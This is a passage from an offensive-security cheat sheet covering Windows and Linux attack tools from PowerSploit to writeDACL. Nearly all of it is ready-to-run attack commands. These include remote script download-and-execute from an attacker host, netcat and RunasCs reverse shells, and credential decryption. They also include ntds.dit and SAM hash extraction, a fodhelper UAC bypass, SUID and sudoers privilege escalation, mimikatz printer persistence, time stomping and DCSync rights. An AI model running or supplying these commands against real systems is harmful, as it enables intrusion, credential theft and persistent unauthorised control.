PS C:\> $encryptedPassword = $xmlContent.Objs.Obj.Props.SS.'#text'
PS C:\> $securePassword = $encryptedPassword | ConvertTo-SecureString
PS C:\> $username = $xmlContent.Objs.Obj.Props.S.'#text'
PS C:\> $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
PS C:\> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password)
PS C:\> $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS C:\> Write-Output $plainPassword
```

#### One-Liner

```c
PS C:\> $cred = Import-CliXml -Path Credentials.xml; $cred.GetNetworkCredential() | Format-List *
```

## PowerSploit

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

### Import

```c
PS C:\> Import-Module .\PowerView.ps1
```

or

```c
PS C:\> iex(new-object net.webclient).downloadstring('http://<LHOST>/PowerView.ps1')
```

### Set Credentials

```c
PS C:\> $SecPass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\LDAP', $SecPass)
```

### Example

```c
PS C:\> Get-DomainUser -Credential $cred -DomainController dc.<DOMAIN>
```

## PowerView

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```c
PS C:\> curl http://<LHOST>/PowerView.ps1 | iex
```

## Pre-created Computer Accounts

> https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/

```c
$ changepasswd.py -protocol rpc-samr -newpass <PASSWORD> '<DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>'
```

## PRET

> https://github.com/RUB-NDS/PRET

```c
$ ./pret.py
$ ./pret.py <RHOST> ps    // pjl
```

```c
<RHOST>:/> ls
<RHOST>:/> cd
<RHOST>:/> get
<RHOST>:/> nvram dump
```

## procdump

```c
PS C:\> .\procdump64.exe -accepteula -ma <PID>
PS C:\> type <FILE>.dmp | Select-String "username="
```

## PsExec

```c
PS C:\> .\psexec.exe -hashes :<HASH> administrator@127.0.0.1 "<COMMAND>"
```

## pspy

>  https://github.com/DominicBreuker/pspy

```c
$ pspy64 -f
$ pspy64 -pf -i 1000
```

## pth-toolkit

> https://github.com/byt3bl33d3r/pth-toolkit

```c
$ pth-net rpc group addmem "<GROUP>" <USERNAME> -U <DOMAIN>/<USERNAME> -S <RHOST>
$ pth-net rpc password --pw-nt-hash <USERNAME> -U <DOMAIN>/<COMPUTERNAME>%<HASH> -S <RHOST>
$ pth-smbclient --user=<USERNAME> --pw-nt-hash -m smb3 \\\\<RHOST>\\<USERNAME> <HASH>
```

## pwncat

> https://github.com/calebstewart/pwncat

> https://pwncat.readthedocs.io/en/latest/usage.html

### Common Commands

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
$ pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

## pyGPOAbuse

> https://github.com/Hackndo/pyGPOAbuse

```c
$ python3 pygpoabuse.py <DOMAIN>/<USERNAME> -hashes :<HASH> -gpo-id "<GPO_ID>" -dc-ip <RHOST>
```

## Python

### System Shell

```c
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Python Library Hijacking

> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

> https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7

### Get the current Path

```c
$ python3 -c 'import sys;print(sys.path)'
```

### remoteshell.py

```c
import os
os.system("nc -lnvp <LPORT> -e /bin/bash")
```

### Include Path

```c
$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```

## rbash

### Restricted Bash (rbash) Breakouts

#### Environment Enumeration

```c
$ export -p
$ env
$ echo $0
$ echo $PATH
```

#### Checking $PATH Variable

```c
$ ls /home/<USERNAME>/usr/bin
$ echo /home/<USERNAME>/usr/bin/*
```

#### Breakout using $PATH Variable

```c
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#### Breakout using GTFObins

- less
- ls
- scp
- vi

##### Examples using less

```c
$ less /etc/profile
!/bin/sh
```

```c
$ VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```c
$ less /etc/profile
v:shell
```

##### Example using scp

```c
$ TF=$(mktemp)
$ echo 'sh 0<&2 1>&2' > $TF
$ chmod +x "$TF"
$ scp -S $TF x y:
```

##### Examples using vi

```c
$ vi -c ':!/bin/sh' /dev/null
```

```c
$ vi
:set shell=/bin/sh
:shell
```

#### Breackout using SSH Command Execution

```c
$ ssh <USERNAME>@<RHOST> -t sh
$ ssh <USERNAME>@<RHOST> -t /bin/sh
$ ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```

## relayd

### Prerequisites

The binary need to have the `SUID` bit set.

```c
$ /usr/sbin/relayd -C /etc/shadow
[ERR] 2023-09-27 14:18:13 config.cpp:1539 write
[ERR] 2023-09-27 14:18:13 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2023-09-27 14:18:13 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2023-09-27 14:18:13 invalid config file
```

## rpcclient

### LDAP

```c
$ rpcclient -U "" <RHOST>
```

#### Queries

```c
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid <SID>
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser <USERNAME>
srvinfo
```

## Rubeus

> https://github.com/GhostPack/Rubeus

### Overpass the Hash

```c
PS C:\> Rubeus.exe kerberoast /user:<USERNAME>
```

### Pass the Hash

```c
PS C:\> .\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

### .NET Reflection

#### Example

```c
$ base64 Rubeus.exe -w0 > <FILE>.txt
```

```c
PS C:\> $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String((new-object net.webclient).downloadstring('http://<RHOST>/<FILE>.txt')))
```

```c
PS C:\> [Rubeus.Program]::MainString("kerberoast /creduser:<DOMAIN>\<USERNAME> /credpassword:<PASSWORD>")
```

## RunasCs

> https://github.com/antonioCoco/RunasCs

```c
C:\> .\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
C:\> .\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
C:\> .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
```

## SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
PS C:\> diskshadow /s <FILE>.txt
```

### Copy ntds.dit

```c
PS C:\> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

### Export System Registry Value

```c
PS C:\> reg save HKLM\SYSTEM c:\temp\system
```

### Extract the Hashes

```c
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

### Alternative Way via Robocopy

```c
C:\> reg save hklm\sam C:\temp\sam
C:\> reg save hklm\system C:\temp\system
```

```c
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
 
```c
C:\temp\> diskshadow /s script.txt
C:\temp\> robocopy /b E:\Windows\ntds . ntds.dit
```

```c
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

## setcap

```c
$ setcap cap_setgid,cap_setuid+eip <FILE>
```

## Shared Library Misconfiguration

> https://tbhaxor.com/exploiting-shared-library-misconfigurations/

### shell.c

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

### Compiling

```c
$ gcc -shared -fPIC -nostartfiles -o <FILE>.so <FILE>.c
```

## SharpDPAPI

```c
PS C:\> .\SharpDPAPI.exe triage
PS C:\> .\SharpDPAPI.exe masterkeys /rpc
```

## SharpHound

>  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe

```c
PS C:\> .\SharpHound.exe --CollectionMethod All
```

## Shell Upgrade

```c
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

or

```c
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ Ctrl + z
$ stty raw -echo
fg
Enter
Enter
$ export XTERM=xterm
```

Alternatively:

```c
$ script -q /dev/null -c bash
$ /usr/bin/script -qc /bin/bash /dev/null
```

### Oneliner

```c
$ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

### Fixing Staircase Effect

```c
$ env reset
```

or

```c
$ stty onlcr
```

## Sherlock

> https://github.com/rasta-mouse/Sherlock

### Config

Add `Find-AllVulns` at the end of the script to run it as soon as it get's loaded.

```c
            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
            default { $VulnStatus = "Not Vulnerable" }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}
Find-AllVulns

$ IEX(New-Object Net.webclient).downloadString('http://<LHOST>/Sherlock.ps1')
```

## smbpasswd

```c
$ smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
```

## systemctl

### Malicious Service Privilege Escalation

#### Payload

```c
[Unit]
Description=Example Service

[Service]
Type=simple
ExecStart=chmod +s /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target

```

#### Installation

```c
$ echo '[Unit]
Description=Example Service

[Service]
Type=simple
ExecStart=chmod +s /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/<SERVICE>.service
```

#### Execution

```c
$ sudo systemctl restart <SERVICE>
```

## Time Stomping

```c
$dateTime = New-Object System.DateTime(1999,12,26)
$regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\helpsvc",$true)[RegRoutines.NativeMethods]::SetRegistryKeyDateTime($regKey, $dateTime)
```

## Universal Privilege Escalation and Persistence Printer

```c
$printerName     = 'Pentest Lab Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
```

```c
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
```

```c
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

## User Account Control (UAC) Bypass

### With UI available

```c
PS C:\> Start-Process powershell -Verb runAs
PS C:\> Start-Process powershell -Verb runAs /user:<USERNAME> cmd.exe
```

### Using fodhelper.exe

> https://github.com/nobodyatall648/UAC_Bypass

```c
PS C:\> New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "C:\Users\<USERNAME>\Downloads\<FILE>" -Force
```

```c
PS C:\> New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
```

```c
PS C:\> Start-Process "C:\Windows\System32\fodhelper.exe"
```

## User Group Exploitation

> https://wixnic.github.io/linux-privesc-groups/

> https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/

### Possibilities

```c
- Edit /etc/passwd    // copy it to /tmp to edit
- Add new SSH Key to /root/
```

### Find modifyable Files

```c
$ find / -group root -perm -g=w ! -type l 2>/dev/null | grep -v 'proc\|sys' | xargs ls -l
```

### Option 1

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('cp /bin/sh /tmp/sh')
       os.system('chmod u+s /tmp/sh')
except:
       sys.exit()
```

### Option 2

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('echo "$USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')
except:
       sys.exit()
```

## VSS

> https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators 

### Abusing Server Operator Group Membership to get a Reverse Shell

```c
$ sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <LHOST> <LPORT>"
$ sc.exe stop vss
$ sc.exe start vss
```

## WDigest

### Store Cleartext Credentials Cleartext in LSASS

```c
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name "UseLogonCredential" -Value '1'"
```

## Whisker

```c
C:\> .\Whisker.exe add /target:<USERNAME>
```

## Windows-Exploit-Suggester

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Prerequisites

```c
$ python -m pip install xlrd
```

### Update

```c
$ ./windows-exploit-suggester.py --update
```

### Usage

```c
$ ./windows-exploit-suggester.py --database 2020-07-15-mssb.xls --systeminfo sysinfo
```

## winexe

```c
$ winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
$ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

## World Writeable Directories

> https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56

```c
C:\Windows\debug\wia
C:\Windows\Registration\CRMLog
C:\Windows\System32\Com\dmp
C:\Windows\System32\fxstmp
C:\Windows\System32\Microsoft\Crypto\rsa\machinekeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\Tasks
C:\Windows\System32\Tasks_Migrated\Microsoft\Windows\PLA\System
C:\Windows\SysWOW64\Com\dmp
C:\Windows\SysWOW64\fxstmp
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\Tasks\microsoft\Windows\PLA\System
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
```

## writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

### Usage

```c
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
PS C:\> Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```
